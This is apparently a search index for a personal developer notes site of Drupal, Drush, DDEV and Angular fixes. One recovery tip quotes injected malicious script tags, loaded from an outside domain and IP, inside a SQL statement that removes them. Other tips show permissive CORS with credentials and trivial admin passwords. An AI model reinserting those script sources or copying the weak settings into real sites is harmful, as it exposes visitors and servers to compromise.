{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Fixes &amp; Hacks","text":"<p>A categorized collection of developer fixes, configurations, and tips across Drupal, Angular, Git, Node, Linux, and more.</p> <p>\ud83d\udee0\ufe0f Collected from real-world debugging and experience.</p>"},{"location":"angular/dummy-server/","title":"Angular Dummy Server","text":""},{"location":"angular/dummy-server/#server-setup-for-angular","title":"Server Setup for Angular","text":"<p>Install PHP and enable <code>mod_proxy</code> and <code>mod_proxy_http</code> in Apache.</p> <p>Example Apache vhost config:</p> <pre><code>&lt;VirtualHost *:80&gt;\n  ServerName &lt;PROJECT&gt;.local.com\n  DocumentRoot \"/var/www/html/&lt;PROJECT&gt;\"\n  ProxyPass \"/jwt\" \"http://&lt;API_SERVER&gt;/jwt\"\n  ProxyPass \"/api\" \"http://&lt;API_SERVER&gt;/api\"\n&lt;/VirtualHost&gt;\n</code></pre>"},{"location":"angular/dummy-server/#project-setup","title":"Project Setup","text":"<pre><code>git clone ...\ncd folder\nnpm install\n</code></pre>"},{"location":"angular/dummy-server/#setup-a-dummy-server-in-angular","title":"Setup a Dummy Server in Angular","text":"<p>Install json-server:</p> <pre><code>npm install json-server\n</code></pre>"},{"location":"angular/dummy-server/#example-proxyconfigjson","title":"Example proxy.config.json","text":"<pre><code>{\n  \"/demo/*\": {\n    \"target\": \"http://localhost:3000\",\n    \"secure\": false,\n    \"changeOrigin\": true\n  },\n  \"/api/*\": {\n    \"target\": \"http://192.168.0.113\",\n    \"secure\": false,\n    \"changeOrigin\": true\n  }\n}\n</code></pre>"},{"location":"angular/dummy-server/#example-dbjson","title":"Example db.json","text":"<pre><code>{\n  \"header\": {\n    \"status\": true,\n    \"data\": {\n      \"userDetails\": {\n        \"name\": \"&lt;USER_NAME&gt;\",\n        \"imageUrl\": \"http://localhost:4200/assets/images/user.jpg\"\n      },\n      \"menu\": [\n        { \"child\": false, \"title\": \"My Menu 1\", \"url\": \"/\" },\n        { \"child\": false, \"title\": \"My Menu 2\", \"url\": \"/\" }\n      ]\n    }\n  }\n}\n</code></pre>"},{"location":"angular/dummy-server/#centralize-urls","title":"Centralize URLs","text":"<pre><code>export const URLS = {\n  header: '/demo/header'\n};\n</code></pre>"},{"location":"angular/dummy-server/#fetch-values-from-api","title":"Fetch Values from API","text":"<pre><code>import { Component, OnInit } from '@angular/core';\nimport { Header } from './header';\nimport { HttpClient } from '@angular/common/http';\nimport { URLS } from '../core/env/urls';\n\n@Component({\n selector: 'app-header',\n templateUrl: './header.component.html',\n styleUrls: ['./header.component.scss']\n})\nexport class HeaderComponent implements OnInit {\n  header: Header;\n  constructor(private httpClient: HttpClient) { }\n  ngOnInit() { this.getHeader(); }\n  private getHeader() {\n    this.httpClient.get(URLS.header)\n      .subscribe((d: { status: boolean; data?: Header }) =&gt; {\n        if (d.status) this.header = d.data;\n      }, err =&gt; {\n        console.log(err);\n        alert('could not fetch header');\n      });\n  }\n}\n</code></pre> <ul> <li><code>subscribe()</code> takes two params: success and error handlers.</li> </ul>"},{"location":"angular/dummy-server/#use-a-service-for-shared-data","title":"Use a Service for Shared Data","text":"<p>Generate a service:</p> <pre><code>ng g s UserDetails\n</code></pre> <p>Add to <code>app.module.ts</code>:</p> <pre><code>providers: [&lt;SERVICE_NAME&gt;],\n</code></pre>"},{"location":"drupal/code-snippets/","title":"Drupal Code Snippets &amp; Tips","text":""},{"location":"drupal/code-snippets/#get-the-list-key-and-value-in-an-entity","title":"Get the list key and value in an entity","text":"<pre><code>$node-&gt;field_my_field-&gt;getSetting('allowed_values')[$node-&gt;field_my_field-&gt;value];\n</code></pre>"},{"location":"drupal/code-snippets/#save-third-party-settings-in-an-entity","title":"Save third party settings in an entity","text":"<pre><code>$type-&gt;setThirdPartySetting('node_save_redirect', 'save_type', 0);\n</code></pre>"},{"location":"drupal/code-snippets/#ajaxsucurifirewall-issues","title":"Ajax/Sucuri/Firewall Issues","text":"<ul> <li>Sucuri or firewall may block URLs containing the word <code>ajax</code>.</li> <li>File upload in <code>managed_file</code> (Ajax error, Serialization error):</li> </ul> <pre><code>public function __sleep() {\n  return [];\n}\n</code></pre>"},{"location":"drupal/code-snippets/#translation-pass-variable-to-strings","title":"Translation: Pass variable to strings","text":"<pre><code>return $this-&gt;t('Revision of %title from %date', [\n  '%title' =&gt; $order_shipping_entity-&gt;label(),\n  '%date' =&gt; $this-&gt;dateFormatter-&gt;format($order_shipping_entity-&gt;getRevisionCreationTime()),\n]);\n</code></pre>"},{"location":"drupal/code-snippets/#twig-examples","title":"Twig Examples","text":"<ul> <li>Translate block:</li> </ul> <pre><code>{% trans %}\n  Your order #{{data.order_number}} has failed. Please check with the administrator -\n{% endtrans %}\n</code></pre> <ul> <li>Translate with variable:</li> </ul> <pre><code>{% set name = '@label Introduction' |t({'@label': node.title.value}) %}\n</code></pre> <ul> <li>Get URL from link field:</li> </ul> <pre><code>{{ content.field_custom_link.0.getUrl().toString() }}\n{{ content.field_custom_link.0['#url'] }}\n{{ content.field_custom_link.0.title }}\n{{ content.field_custom_link.0['#title'] }}\n</code></pre>"},{"location":"drupal/code-snippets/#get-productcontent-types","title":"Get product/content types","text":"<pre><code>\\Drupal::service('entity.manager')-&gt;getStorage('commerce_product_type')-&gt;loadMultiple();\n\\Drupal::service('entity.manager')-&gt;getStorage('node_type')-&gt;loadMultiple();\n</code></pre>"},{"location":"drupal/code-snippets/#lang-switcher-is-active-class-not-working","title":"Lang switcher is-active class not working","text":"<pre><code>l = $('.lang-switch', context).find('li').length ? $('.lang-switch', context).find('li') : $('.lang-switch').find('li');\nl.each(function () {\n  if ($(this).hasClass(settings.path.currentLanguage))\n    $(this).not('.is-active').addClass('is-active');\n});\n</code></pre>"},{"location":"drupal/code-snippets/#drupal-core-vulnerability-fix-in-759-how-to-recover","title":"Drupal core vulnerability fix in 7.59 (How to recover)","text":"<ul> <li>Find and remove injected code from the database:</li> </ul> <pre><code>UPDATE field_data_body SET body_value=REPLACE(body_value,\"&lt;script type='text/javascript' src='https://js.localstorage.tk/s.js?qr=888'&gt;&lt;/script&gt;&lt;script type='text/javascript' src='http://193.201.224.233/m.js?d=1'&gt;&lt;/script&gt;\",'')\n</code></pre>"},{"location":"drupal/code-snippets/#creating-a-custom-block-programmatically","title":"Creating a custom block programmatically","text":"<p>See: https://medium.com/@kporras07/create-content-blocks-programatically-in-drupal-8-644fef292b84</p>"},{"location":"drupal/code-snippets/#create-nodes-using-migrate-module","title":"Create nodes using Migrate module","text":"<ul> <li>See official documentation.</li> </ul>"},{"location":"drupal/code-snippets/#sample-custom-db-query-in-drupal-8","title":"Sample custom DB query in Drupal 8","text":"<pre><code>// Complex query with group by and having\n$mainQuery1 = Database::getConnection()-&gt;select('node__field_office_hours', 'a',[]);\n$mainQuery1-&gt;fields('a',['entity_id']);\n$mainQuery1-&gt;groupBy('a.entity_id, a.`field_office_hours_day`');\n$mainQuery1-&gt;having('COUNT(*) &gt; 1');\n$tempResult1 = $mainQuery1-&gt;execute()-&gt;fetchAll();\n\n$mainQuery = Database::getConnection()-&gt;select($mainQuery1,'b');\n$mainQuery-&gt;fields('b',['entity_id']);\n$mainQuery-&gt;groupBy('b.entity_id');\n$mainQuery-&gt;preExecute();\n$mainQuery-&gt;getArguments();\n$str = (string) $mainQuery;\n$tempResult = $mainQuery-&gt;execute()-&gt;fetchAll();\n\n// Or using raw SQL\n$subQuery = \\Drupal::database()-&gt;query(\n    \"SELECT b.entity_id FROM (SELECT a.entity_id FROM `node__field_office_hours` AS a GROUP BY a.`entity_id`, a.`field_office_hours_day` HAVING COUNT(*) &gt;\" . $eveningFilter . \") AS b GROUP BY b.`entity_id`\"\n);\n$subResult = $subQuery-&gt;fetchAll();\n</code></pre>"},{"location":"drupal/code-snippets/#render-a-webform","title":"Render a webform","text":"<pre><code>$webform = \\Drupal::entityTypeManager()-&gt;getStorage('webform')-&gt;load(webformId);\n$view_builder = \\Drupal::service('entity_type.manager')-&gt;getViewBuilder('webform');\n$build = $view_builder-&gt;view($webform);\n// OR\n$webform = \\Drupal::entityTypeManager()-&gt;getStorage('webform')-&gt;load(webformId)-&gt;getSubmissionForm();\n</code></pre>"},{"location":"drupal/code-snippets/#adding-a-twig-extension","title":"Adding a Twig extension","text":"<p>Use drush command for this below is a sample code snippet</p> <pre><code>class MymoduleTwigExtension extends TwigExtension {\n  public function getFunctions() {\n    return [\n      new Twig_SimpleFunction('url_path', array($this, 'getPathFromUrl'))\n    ];\n  }\n  public function getName() {\n    return 'mymodule_core';\n  }\n  public function getPathFromUrl(Url $url) {\n    return $url-&gt;toString();\n  }\n}\n</code></pre>"},{"location":"drupal/code-snippets/#move-all-modules-from-one-place-to-another","title":"Move all modules from one place to another","text":"<ul> <li>Backup your database</li> <li>Check-in your code into version control</li> <li>Run queries:</li> </ul> <pre><code>UPDATE system SET filename = REPLACE(filename, 'sites/all/modules', 'sites/all/modules/contrib');\nUPDATE registry SET filename = REPLACE(filename, 'sites/all/modules', 'sites/all/modules/contrib');\nUPDATE registry_file SET filename = REPLACE(filename, 'sites/all/modules', 'sites/all/modules/contrib');\n</code></pre> <ul> <li>Move folders</li> <li>Run <code>drush cr</code></li> </ul>"},{"location":"drupal/code-snippets/#render-a-view","title":"Render a View","text":"<pre><code>$args = [$tid];\n$view = Views::getView('test_view');\nif (is_object($view)) {\n  $view-&gt;setArguments($args);\n  $view-&gt;setDisplay('block');\n  $view-&gt;preExecute();\n  $view-&gt;execute();\n  $content = $view-&gt;buildRenderable('block', $args);\n}\n</code></pre>"},{"location":"drupal/code-snippets/#custom-entity-boiler-plate-code","title":"Custom Entity (Boiler Plate Code)","text":""},{"location":"drupal/code-snippets/#common-format-for-a-custom-field","title":"Common format for a custom field","text":"<pre><code>$fields['name'] = BaseFieldDefinition::create('string')\n  -&gt;setLabel(t('Name'))\n  -&gt;setDescription(t('Description'))\n  -&gt;setTranslatable(TRUE)\n  -&gt;setRevisionable(TRUE)\n  -&gt;setSettings([\n    'max_length' =&gt; 50,\n    'text_processing' =&gt; 0,\n  ])\n  -&gt;setDefaultValue('Razeem')\n  -&gt;setDisplayOptions('view', [\n    'label' =&gt; 'above',\n    'type' =&gt; 'string',\n    'weight' =&gt; -4,\n  ])\n  -&gt;setDisplayOptions('form', [\n    'type' =&gt; 'string_textfield',\n    'weight' =&gt; -4,\n  ])\n  -&gt;setDisplayConfigurable('form', TRUE)\n  -&gt;setDisplayConfigurable('view', TRUE)\n  -&gt;setRequired(TRUE);\n</code></pre>"},{"location":"drupal/code-snippets/#examples","title":"Examples","text":"<ul> <li>String, Integer, Float, Email, Entity reference, String list, Image (see full prompt for details)</li> </ul> <p>For more, see the official Drupal documentation.</p>"},{"location":"drupal/code-snippets/#user-registration-send-an-email","title":"User registration send an email","text":"<pre><code>_user_mail_notify($op, $account);\n</code></pre> <ul> <li>Possible values for <code>$op</code>:</li> <li>'register_admin_created', 'register_no_approval_required', 'register_pending_approval', 'password_reset', 'status_activated', 'status_blocked', 'cancel_confirm', 'status_canceled'</li> </ul>"},{"location":"drupal/code-snippets/#get-route-name-from-current-url","title":"Get route name from current url","text":"<pre><code>$variables['route_name'] = \\Drupal::routeMatch()-&gt;getRouteName();\n</code></pre>"},{"location":"drupal/code-snippets/#insert-route-in-menu","title":"Insert Route in menu","text":"<ul> <li>Example: <code>route:views_ui.settings_basic</code></li> </ul>"},{"location":"drupal/code-snippets/#generate-url-full-path","title":"Generate url full path","text":"<pre><code>$url = \\Drupal\\Core\\Url::fromUri(\"base:/user/$uid\",array('absolute' =&gt; TRUE))-&gt;toString();\n</code></pre>"},{"location":"drupal/code-snippets/#generate-url-from-route","title":"Generate url from route","text":"<pre><code>\\Drupal::url('tex.dashboard');\n</code></pre>"},{"location":"drupal/code-snippets/#convert-url-from-path","title":"Convert url from path","text":"<pre><code>$url = '/taxonomy/term/' . $tid;\n$result = \\Drupal::service('path.alias_manager')-&gt;getAliasByPath($url);\n</code></pre>"},{"location":"drupal/code-snippets/#get-url-from-url-object","title":"Get URL from Url object","text":"<pre><code>$slidersObject[1]-&gt;field_read_more[0]-&gt;getUrl()-&gt;setAbsolute()-&gt;toString();\n</code></pre>"},{"location":"drupal/dependency-injection/","title":"Drupal 8 Dependency Injection","text":""},{"location":"drupal/dependency-injection/#method-for-forms","title":"Method for Forms","text":"<pre><code>/**\n * Drupal\\payment_myfatoorah\\MyFatoorahExtensionService definition.\n * @var \\Drupal\\payment_myfatoorah\\MyFatoorahExtensionService\n */\nprotected $myFatoorahExtension;\n\n/**\n * Class constructor.\n */\npublic function __construct(MyFatoorahExtensionService $my_fatoorah_extension) {\n  $this-&gt;myFatoorahExtension = $my_fatoorah_extension;\n}\n\n/**\n * {@inheritdoc}\n */\npublic static function create(ContainerInterface $container) {\n  return new static(\n    $container-&gt;get('payment_myfatoorah.extension')\n  );\n}\n</code></pre>"},{"location":"drupal/dependency-injection/#method-for-rest-plugins","title":"Method for REST Plugins","text":"<pre><code>/**\n * Drupal\\&lt;SERVICE&gt;_jwt\\&lt;Service&gt;LoginService definition.\n * @var \\Drupal\\&lt;SERVICE&gt;_jwt\\&lt;Service&gt;LoginService\n */\nprotected $serviceLoginService;\n\n/**\n * {@inheritdoc}\n */\npublic static function create(ContainerInterface $container, array $configuration, $plugin_id, $plugin_definition) {\n  $instance = parent::create($container, $configuration, $plugin_id, $plugin_definition);\n  $instance-&gt;serviceLoginService = $container-&gt;get('&lt;service&gt;_jwt.login');\n  return $instance;\n}\n</code></pre>"},{"location":"drupal/dependency-injection/#method-using-servicesyml","title":"Method using services.yml","text":"<ul> <li>In <code>services.yml</code>:   <code>yaml   abo_helper_module.helper:     class: Drupal\\abo_helper_module\\HelperService     arguments: ['@config.factory']</code></li> <li>In <code>service.php</code>:   ```php   /**</li> <li>@var [Drupal\\Core\\Config\\ConfigFactoryInterface]    */   protected $configFactory;</li> </ul> <p>/*    * Constructs a new HelperService object.    /   public function __construct(     ConfigFactoryInterface $config_factory   ) {     $this-&gt;configFactory = $config_factory;   }   ```</p>"},{"location":"drupal/drush-commands/","title":"Drush Commands and Useful Operations","text":""},{"location":"drupal/drush-commands/#configuration-maintenance","title":"Configuration &amp; Maintenance","text":"<ul> <li>Import configuration:   <code>drush cim</code></li> <li>Export configuration:   <code>drush config-export --destination=\"&lt;folder-path&gt;\"</code></li> <li>Import/export config to custom folder:   <code>drush config-import --source=\"&lt;folder-path&gt;\"   drush config-export --destination=\"&lt;folder-path&gt;\"</code></li> <li>Set config sync directory:   <code>php   $settings['config_sync_directory'] = '../config/sync';   $config_directories['sync'] = '../config/sync';</code></li> <li>Set maintenance mode:   <code>drush config:set system.maintenance message \"Optional message\" -y   drush state:set system.maintenance_mode 1 --input-format=integer   drush cr   # To turn off:   drush state:set system.maintenance_mode 0 --input-format=integer   drush cr</code></li> </ul>"},{"location":"drupal/drush-commands/#site-setup-install","title":"Site Setup &amp; Install","text":"<ul> <li>Example site install:   <code>drush site-install standard --db-url=mysql://root:&lt;PASSWORD&gt;@localhost/&lt;SITE_FOLDER&gt; --account-mail=\"&lt;EMAIL&gt;\" --account-name=superadmin --account-pass=123456 --site-mail=\"&lt;EMAIL&gt;\" --site-name=\"&lt;SITE_NAME&gt;\"</code></li> </ul>"},{"location":"drupal/drush-commands/#uuid-entity-management","title":"UUID &amp; Entity Management","text":"<ul> <li>Synchronize UUID:   <code>drush config-set \"system.site\" uuid \"&lt;new-uuid&gt;\"</code></li> <li>Generate UUID:   <code>ddev drush php-eval 'print(\\Drupal::service(\"uuid\")-&gt;generate().PHP_EOL);'</code></li> <li>Delete shortcut set:   <code>drush entity:delete shortcut_set default</code></li> <li>List custom blocks and UUIDs:   <code>drush sqlq 'SELECT id,uuid FROM block_content'</code></li> </ul>"},{"location":"drupal/drush-commands/#content-data","title":"Content &amp; Data","text":"<ul> <li>Generate sample content:   <code>drush genc &lt;number of nodes&gt; &lt;number of comments&gt; --types=&lt;content type&gt;   # Example:   drush genc 3 0 --types=bank</code></li> </ul>"},{"location":"drupal/drush-commands/#database-files","title":"Database &amp; Files","text":"<ul> <li>Dump database and files:   <code>drush sql-dump &gt; \"/&lt;COMPANY_DRIVE&gt;/${PWD##*/}/$(date +\"%Y-%m-%d\")/${PWD##*/}-$(date +\"%Y-%m-%d\").sql\"</code></li> <li>Import database:   <code>drush sql-drop -y; drush sql-cli &lt; path_to_sql.sql</code></li> </ul>"},{"location":"drupal/drush-commands/#cache-updates-and-entities","title":"Cache, Updates, and Entities","text":"<ul> <li>Clear cache:   <code>drush cr</code></li> <li>Update database:   <code>drush updb</code></li> <li>Update entities:   <code>drush entup</code></li> </ul>"},{"location":"drupal/drush-commands/#migration","title":"Migration","text":"<ul> <li>Migration commands:   <code>ddev drush ms gea_country_migration   ddev drush mim gea_country_migration --limit=1   ddev drush mr gea_country_migration</code></li> </ul>"},{"location":"drupal/misc-tips/","title":"Miscellaneous Drupal Tips and Fixes","text":""},{"location":"drupal/misc-tips/#1-configuration-environment","title":"1. Configuration &amp; Environment","text":""},{"location":"drupal/misc-tips/#trusted-host-settings","title":"Trusted Host Settings","text":"<p>Add to <code>settings.php</code>:</p> <pre><code>$settings['trusted_host_patterns'] = array(\n  '^example\\.com$',\n  '^www\\.example\\.com$',\n  '^localhost$',\n);\n</code></pre>"},{"location":"drupal/misc-tips/#changing-the-sync-directory","title":"Changing the Sync Directory","text":"<p>Add to <code>settings.local.php</code> or <code>settings.php</code>:</p> <pre><code>$config_directories['sync'] = '{path to the desired folder}/';\n</code></pre>"},{"location":"drupal/misc-tips/#cors-configuration","title":"CORS Configuration","text":"<ul> <li>Copy <code>default.services.yml</code> to <code>services.yml</code> and set <code>cors.config</code> as needed.</li> </ul> <pre><code>cors.config:\n  enabled: true\n  allowedHeaders: ['x-csrf-token','authorization','content-type','accept','origin','x-requested-with', 'access-control-allow-origin','x-allowed-header','*']\n  allowedMethods: ['*']\n  allowedOrigins: ['https://&lt;DOMAIN&gt;','*']\n  exposedHeaders: false\n  maxAge: false\n  supportsCredentials: true\n</code></pre>"},{"location":"drupal/misc-tips/#temp-folder-issues","title":"Temp Folder Issues","text":"<ul> <li>Set the temp folder path to the server's temp location (e.g. <code>/var/sentora/temp</code>).</li> </ul>"},{"location":"drupal/misc-tips/#tcpdf-cache-directory","title":"TCPDF Cache Directory","text":"<ul> <li>Create <code>tcpdf/cachecahe</code> in the temp folder if needed.</li> </ul>"},{"location":"drupal/misc-tips/#php-opcode-caching","title":"PHP OPcode Caching","text":"<ul> <li>Install opcache and add to <code>php.ini</code>:</li> </ul> <pre><code>[opcache]\nzend_extension=php_opcache.dll\nopcache.enable=1\n</code></pre>"},{"location":"drupal/misc-tips/#2-file-directory-issues","title":"2. File &amp; Directory Issues","text":""},{"location":"drupal/misc-tips/#site-broken-when-aggregation-is-on","title":"Site Broken When Aggregation is On","text":"<ul> <li>Ensure <code>sites/default/files</code> and temp directory have full write permission.</li> <li>If still broken, deactivate all lines in <code>.htaccess</code> in <code>sites/default/files</code>, clear cache, then reactivate lines.</li> </ul>"},{"location":"drupal/misc-tips/#importexport-database-and-files","title":"Import/Export Database and Files","text":"<ul> <li>Dump database:</li> </ul> <pre><code>drush sql-dump &gt; \"/&lt;COMPANY_DRIVE&gt;/${PWD##*/}/$(date +\"%Y-%m-%d\")/${PWD##*/}-$(date +\"%Y-%m-%d\").sql\"\n</code></pre> <ul> <li>Zip files:</li> </ul> <pre><code>zip -r /&lt;COMPANY_DRIVE&gt;/${PWD##*/}/$(date +\"%Y-%m-%d\")/${PWD##*/}-$(date +\"%Y-%m-%d\").zip web/sites/default/files/\n</code></pre> <ul> <li>Import database and files:</li> </ul> <pre><code>drush sql-drop -y; drush sql-cli &lt; path_to_sql.sql\nsudo mv docroot/sites/default/files docroot/sites/default/files1\nunzip files.zip\nsudo rm -rf docroot/sites/default/files1\ngit clean -f\n</code></pre>"},{"location":"drupal/misc-tips/#3-user-access-issues","title":"3. User &amp; Access Issues","text":""},{"location":"drupal/misc-tips/#super-user-edit-issue","title":"Super User Edit Issue","text":"<ul> <li>If unable to edit super user, check the timezone in <code>user_field_data</code> table for user id 1.</li> </ul>"},{"location":"drupal/misc-tips/#forgot-admin-usernamepassword","title":"Forgot Admin Username/Password","text":"<ul> <li>Get user info:</li> </ul> <pre><code>drush uinf uid\n# Example: drush uinf 1\n</code></pre> <ul> <li>Reset password:</li> </ul> <pre><code>drush upwd username --password=newpassword\n# Example: drush upwd admin --password=abc123\n</code></pre>"},{"location":"drupal/misc-tips/#4-module-entity-issues","title":"4. Module &amp; Entity Issues","text":""},{"location":"drupal/misc-tips/#mismatched-entityfield-definitions","title":"Mismatched Entity/Field Definitions","text":"<ul> <li>Run:</li> </ul> <pre><code>drush entup\n</code></pre>"},{"location":"drupal/misc-tips/#missing-module-from-file-system","title":"Missing Module from File System","text":"<ul> <li>Run:</li> </ul> <pre><code>drush sql-query \"DELETE FROM key_value WHERE collection='system.schema' AND name='module_name';\"\n</code></pre>"},{"location":"drupal/misc-tips/#list-custom-blocks-and-their-uuids","title":"List Custom Blocks and Their UUIDs","text":"<pre><code>drush sqlq 'SELECT id,uuid FROM block_content'\n</code></pre>"},{"location":"drupal/misc-tips/#5-caching-performance","title":"5. Caching &amp; Performance","text":""},{"location":"drupal/misc-tips/#php-opcode-caching_1","title":"PHP OPcode Caching","text":"<ul> <li>See above in Configuration &amp; Environment.</li> </ul>"},{"location":"drupal/misc-tips/#update-notifications","title":"Update Notifications","text":"<ul> <li>Enable Update Manager module in backend.</li> </ul>"},{"location":"drupal/misc-tips/#6-database-content-management","title":"6. Database &amp; Content Management","text":""},{"location":"drupal/misc-tips/#generate-sample-content-for-testing","title":"Generate Sample Content for Testing","text":"<pre><code>drush genc &lt;number of nodes&gt; &lt;number of comments&gt; --types=&lt;content type&gt;\n# Example: drush genc 3 0 --types=bank\n</code></pre>"},{"location":"drupal/misc-tips/#import-and-export-configuration-to-a-custom-folder","title":"Import and Export Configuration to a Custom Folder","text":"<pre><code>drush config-import --source=\"&lt;folder-path&gt;\"\ndrush config-export --destination=\"&lt;folder-path&gt;\"\n</code></pre>"},{"location":"drupal/misc-tips/#configuration-directory-type-sync-does-not-exist","title":"Configuration Directory Type 'sync' Does Not Exist","text":"<p>Add one of these to your settings file:</p> <pre><code>$settings['config_sync_directory'] = '../config/sync';\n$config_directories['sync'] = '../config/sync';\n</code></pre>"},{"location":"drupal/misc-tips/#sync-uuid-when-drush-is-not-configured","title":"Sync UUID When Drush is Not Configured","text":"<ul> <li>Go to the database config table, search for <code>system.site</code>, download the data blob, edit the uuid, and replace it with the uuid from the main site.</li> </ul>"},{"location":"drupal/misc-tips/#7-phpcs-and-phpmd","title":"7. PHPCS and PHPMD","text":"<ul> <li>Install PHPCS:</li> </ul> <pre><code>composer global require drupal/coder\nphpcs modules/custom &gt; phpcs-modules.txt\nphpcs modules/custom &gt; phpcs-modules.txt -d memory_limit=512M\n</code></pre> <ul> <li>Install PHPMD:</li> </ul> <pre><code>composer global require phpmd/phpmd\nphpmd modules/custom html cleancode --reportfile phpmd.html\n</code></pre>"},{"location":"drupal/misc-tips/#8-miscellaneous","title":"8. Miscellaneous","text":"<ul> <li>For more Drush and Drupal Console commands, see the official documentation.</li> </ul>"},{"location":"drupal/multisite/","title":"Drupal Multisite Configuration","text":""},{"location":"drupal/multisite/#sample-ddev-multisite-configuration","title":"Sample DDEV multisite configuration","text":"<p>Add the additional hostnames and database names in the ddev config yaml file</p> <pre><code>name: &lt;project-name&gt;\ntype: drupal\ndocroot: web\nphp_version: \"8.2\"\nwebserver_type: nginx-fpm\nxdebug_enabled: false\nadditional_hostnames:\n  - &lt;multisite1&gt;\n  - &lt;multisite2&gt;\n  - &lt;multisite3&gt;\n  - &lt;multisite4&gt;\n  - &lt;multisite5&gt;\n  - &lt;multisite6&gt;\n  - &lt;multisite7&gt;\n  - &lt;multisite8&gt;\n  - &lt;multisite9&gt;\nadditional_fqdns: []\ndatabase:\n  type: mariadb\n  version: \"10.11\"\nuse_dns_when_possible: true\ncomposer_version: \"2\"\nweb_environment: []\ncorepack_enable: true\nhooks:\n  post-start:\n    - exec: |\n        for db in multisite1 multisite2 multisite3 multisite4 multisite5 multisite6 multisite7 multisite8 multisite9; do\n          mysql -uroot -proot -e \"CREATE DATABASE IF NOT EXISTS $db;\"\n        done\n</code></pre> <ul> <li>Check the URLs are live: After <code>ddev start</code> see the URLs are live <code>ddev describe</code></li> <li>Goto sites.php and add the folder links the right hand side will be the folder names   <code>php   $sites['multisite1.ddev.site'] = 'multisite1';   $sites['multisite2.ddev.site'] = 'multisite2';   $sites['multisite3.ddev.site'] = 'multisite3';   $sites['multisite4.ddev.site'] = 'multisite4';   $sites['multisite5.ddev.site'] = 'multisite5';   $sites['multisite6.ddev.site'] = 'multisite6';   $sites['multisite7.ddev.site'] = 'multisite7';   $sites['multisite8.ddev.site'] = 'multisite8';   $sites['multisite9.ddev.site'] = 'multisite9';</code></li> <li>Goto settings.php of each multisite folder and add   ```PHP   $host = \"db\";   $port = 3306;   $driver = \"mysql\";</li> </ul> <p>$databases['default']['default']['database'] = \"multisite1\";   $databases['default']['default']['username'] = \"root\";   $databases['default']['default']['password'] = \"root\";   $databases['default']['default']['host'] = $host;   $databases['default']['default']['port'] = $port;   $databases['default']['default']['driver'] = $driver;   ```</p>"},{"location":"drupal/multisite/#multisite-config-export","title":"Multisite Config Export","text":"<ul> <li>Get multisite URI:   <code>sh   drush debug:multisite</code></li> <li>Set config path in <code>settings.php</code>:   <code>php   $config_directories['sync'] = '../config/sync/&lt;multisite-foldername&gt;';</code></li> <li>Export config for a particular site:   Config files are in <code>sites/&lt;multisite-foldername&gt;/files/config</code>.   <code>drush --uri=&lt;SITE&gt;.localhost config:export</code></li> </ul>"},{"location":"drupal/multisite/#clear-cache-for-multisite","title":"Clear Cache for Multisite","text":"<pre><code>drush cr --uri=&lt;multisite-foldername&gt;\n</code></pre>"},{"location":"drupal/multisite/#other-useful-commands","title":"Other Useful Commands","text":"<ul> <li>Export config for a specific URI:   <code>drush --uri=&lt;multisite-foldername&gt; config:export</code></li> <li>Clear cache for a specific URI:   <code>drush cr all --uri=&lt;SITE&gt;.localhost</code></li> </ul>"},{"location":"drupal/setup/","title":"Local setup","text":""},{"location":"drupal/setup/#instructions-using-ddev","title":"Instructions using DDEV","text":"<ol> <li> <p>Install DDEV Ensure DDEV is installed on your system. Follow the installation guide for your OS on the DDEV official site.</p> </li> <li> <p>Set Up Your Project Directory <code>mkdir drupal11 &amp;&amp; cd drupal11</code></p> </li> <li> <p>Configure DDEV Run the DDEV configuration command specifying Drupal and PHP 8.3:     <code>BASH     ddev config --project-type=drupal --php-version=8.3 --docroot=web</code></p> </li> <li> <p>Start DDEV Services <code>ddev start</code></p> </li> <li> <p>Install Drupal Using Composer Download the Drupal 11 recommended project: <code>ddev composer create drupal/recommended-project:^11</code> Or for a specific version: <code>composer create-project drupal/core-recommended:11.x-dev d11_test_project --stability dev --no-interaction</code></p> </li> <li> <p>Install Drush (Drupal Shell) Drush is essential for efficient Drupal management: <code>ddev composer require drush/drush</code></p> </li> <li> <p>Install and Configure Drupal Use Drush to install Drupal: <code>ddev drush site:install --account-name=admin --account-pass=admin -y</code></p> </li> <li> <p>Launch Your Site Open your site in the browser: <code>ddev launch</code> Alternatively, auto-login: <code>ddev launch $(ddev drush uli)</code></p> </li> </ol>"},{"location":"drupal/setup/#common-issues","title":"Common Issues","text":""},{"location":"drupal/setup/#while-cloning-a-live-project","title":"While Cloning a Live Project","text":"<p>We might encounter issue while config import after installing the site</p>"},{"location":"drupal/setup/#site-uuid-mismatch","title":"Site UUID mismatch","text":"<ul> <li>Edit the <code>system.site</code> record in the database config table and update the UUID.</li> <li><code>ddev drush cset system.site uuid \"$(cat config/sync/system.site.yml | grep uuid | awk '{print $2}')\"</code></li> </ul>"},{"location":"drupal/setup/#shortcut-set-mismatch-issue","title":"Shortcut set mismatch issue","text":"<ul> <li><code>ddev drush entity:delete shortcut_set</code></li> </ul>"},{"location":"drupal/setup/#error-in-loading-site","title":"Error in loading site","text":"<p>If error, check <code>settings.php</code> Set config path in <code>settings.php</code>:</p> <pre><code>$settings['config_sync_directory'] = '../config/sync';\n</code></pre>"},{"location":"drupal/setup/#import-configuration","title":"Import Configuration","text":"<pre><code>drush cim\n</code></pre>"},{"location":"drupal/setup/#debugging-configuration","title":"Debugging Configuration","text":""},{"location":"drupal/setup/#setting-up-development-environment","title":"Setting up Development Environment","text":"<ul> <li>(Optional) Change ownership:   <code>sudo chown -R &lt;user-name&gt;:&lt;group-name&gt; *</code></li> <li>(Optional) Edit permissions for <code>settings.php</code>:   <code>sudo chmod 755 web/sites/default/settings.php</code></li> <li>Edit <code>settings.php</code> to include:   <code>php   if (file_exists(__DIR__ . '/settings.local.php')) {     include __DIR__ . '/settings.local.php';   }</code></li> <li>Copy example local settings:   <code>cp sites/example.settings.local.php sites/default/settings.local.php   sudo chmod 755 web/sites/default/settings.local.php</code></li> </ul>"},{"location":"drupal/setup/#development-settings","title":"Development settings","text":""},{"location":"drupal/setup/#enable-development-mode","title":"Enable Development mode","text":"<p>Add or uncomment these in <code>settings.php</code> or <code>settings.local.php</code>   ```php   $settings['container_yamls'][] = DRUPAL_ROOT . '/sites/development.services.yml';</p> <p>$config['system.performance']['css']['preprocess'] = FALSE;   $config['system.performance']['js']['preprocess'] = FALSE;</p> <p>$settings['cache']['bins']['render'] = 'cache.backend.null';   $settings['cache']['bins']['dynamic_page_cache'] = 'cache.backend.null';   $settings['cache']['bins']['page'] = 'cache.backend.null';   